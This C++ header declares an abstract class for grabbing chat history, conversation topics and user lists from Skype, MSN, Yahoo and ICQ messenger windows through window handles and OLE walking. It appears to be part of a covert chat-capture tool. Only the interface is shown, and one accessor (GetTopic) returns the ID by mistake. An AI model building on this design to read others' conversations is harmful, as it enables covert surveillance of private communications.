/* 
*	QAgent class
*
*	Version: 1.0
*	Author: Quequero
*	Date: 22/Feb/2008
*/

#include <exception>
#include <Windows.h>
#include "QProperty.h"
#include "QOleWalker.h"
using namespace std;

#define UNKNOWN_VERSION 0

#define SKYPE_41 5
#define SKYPE_4 4
#define SKYPE_3 3
#define SKYPE_2 2
#define SKYPE_1 1

#define MSN_LIVE_2011 15
#define MSN_LIVE_2009 14
#define MSN_LIVE 8
#define MSN_7 7
#define MSN_6 6

#define YIM_10 10
#define YIM_8 8
#define YIM_7 7

#define ICQ_7 7

#ifndef __QAgent_h__
#define __QAgent_h__

class QAgent
{
	protected:
		QProperty properties;
		QOleWalker ole;
		BOOL bFirstGrab;

	public:
		virtual BOOL GrabHistory() = 0;
		virtual BOOL GrabTopic() = 0;
		virtual BOOL GrabUserList() = 0;
		virtual const PWCHAR GetMessenger() = 0;
		virtual ~QAgent() {} ;

	// Esponiamo i metodi Get*() di QProperties per consentire all'utente
	// di leggere lo stato degli oggetti.
	public:
		QAgent();
		HWND GetHandle() { return properties.GetHandle(); }
		const PWCHAR GetId() { return properties.GetId(); }
		const PWCHAR GetHistory() { return properties.GetHistory(); }
		UINT GetHistoryLength() { return properties.GetHistoryLength(); }
		const PWCHAR GetType() { return properties.GetType(); }
		BOOL GetAcquiredStatus() { return properties.GetAcquiredStatus(); }
		void SetAcquiredStatus() { properties.SetAcquiredStatus(TRUE); properties.SetUpdated(FALSE); }
		BOOL GetUpdated() { return properties.GetUpdated(); }
		const PWCHAR GetLastLine() { return properties.GetLastLine(); }
		const PWCHAR GetTopic() { return properties.GetId(); }
		const PWCHAR GetUsers() { return properties.GetUsers(); }
};

#endif
